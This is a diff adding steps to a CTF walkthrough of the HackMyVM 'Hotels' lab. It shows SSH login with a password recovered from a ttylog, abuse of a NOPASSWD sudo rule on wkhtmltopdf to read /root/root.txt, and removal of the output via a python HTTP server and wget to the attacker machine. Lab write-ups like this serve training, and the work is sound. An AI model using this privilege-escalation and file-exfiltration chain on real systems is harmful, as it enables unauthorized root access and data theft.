@@ -139,5 +139,77 @@ stty raw -echo;fg
 # Ttylog file
 ```bash
 www-data@dhcppc10:~/html$ ttyplay < ttylog 
-person@hotel:~$ my passw0rd is XXXXXXXXXXXX enjoy
+person@hotel:~$ my passw0rd is XXXXXXXXXXXX enjoy # i hide password
 ```
+# Person 
+```bash
+┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
+└─$ ssh person@192.168.1.110 # here enter password u found                                      
+The authenticity of host '192.168.1.110 (192.168.1.110)' can't be established.
+ED25519 key fingerprint is SHA256:OsYCJAYzE541/4ZyAtfmrZZRGQ7hdWYx8yZEu01QeB8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.110' (ED25519) to the list of known hosts.
+person@192.168.1.110's password: 
+Linux dhcppc10 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Feb 20 14:40:49 2022 from 192.168.1.51
+person@dhcppc10:~$ 
+```
+
+# PrivEsc to Root
+
+```bash
+person@dhcppc10:~$ sudo -l
+sudo: unable to resolve host dhcppc10: Nombre o servicio desconocido
+Matching Defaults entries for person on dhcppc10:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User person may run the following commands on dhcppc10:
+    (root) NOPASSWD: /usr/bin/wkhtmltopdf
+```
+
+```bash
+person@dhcppc10:~$ sudo wkhtmltopdf  /root/root.txt ./rootflag.txt
+sudo: unable to resolve host dhcppc10: Nombre o servicio desconocido
+QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
+Loading page (1/2)
+Printing pages (2/2)                                               
+Done  
+```
+
+``` 
+Lets download the file to our system and read it 
+```
+```bash
+person@dhcppc10:~$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.1.107 - - [23/May/2024 22:25:12] "GET /rootflag.txt HTTP/1.1" 200 -
+===================================
+┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
+└─$ wget 192.168.1.110:8000/rootflag.txt                        
+--2024-05-23 16:25:12--  http://192.168.1.110:8000/rootflag.txt
+Connecting to 192.168.1.110:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7617 (7.4K) [text/plain]
+Saving to: ‘rootflag.txt’
+
+rootflag.txt                 100%[==============================================>]   7.44K  --.-KB/s    in 0s      
+
+2024-05-23 16:25:12 (722 MB/s) - ‘rootflag.txt’ saved [7617/7617]
+
+```
+
+```
+Now we just open it and see root flag 
+happy hacking 
+```
+
+
+![Rootflag](img/rootflag.png)
